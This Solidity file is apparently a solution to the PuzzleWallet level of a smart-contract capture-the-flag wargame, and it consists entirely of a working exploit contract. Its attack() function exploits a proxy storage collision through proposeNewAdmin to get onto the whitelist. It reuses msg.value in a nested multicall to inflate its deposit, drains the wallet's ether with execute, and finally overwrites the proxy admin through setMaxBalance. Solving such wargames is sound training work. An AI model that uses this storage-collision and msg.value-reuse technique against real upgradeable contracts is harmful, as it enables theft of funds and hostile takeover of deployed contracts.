// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";
import "../Levels/PuzzleWallet.sol";

contract PuzzleWalletAttack {
    PuzzleWallet wallet = PuzzleWallet(0x8Ba41269ed69496c07bea886c300016A0BA8FB5E);
    PuzzleProxy px = PuzzleProxy(payable(0x8Ba41269ed69496c07bea886c300016A0BA8FB5E));

    function attack() public {
        //creating encoded function data to pass into multicall
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        // making ourselves owner of wallet
        px.proposeNewAdmin(msg.sender);
        //whitelisting our address
        wallet.addToWhitelist(msg.sender);
        //calling multicall with nested data stored above
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");
        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
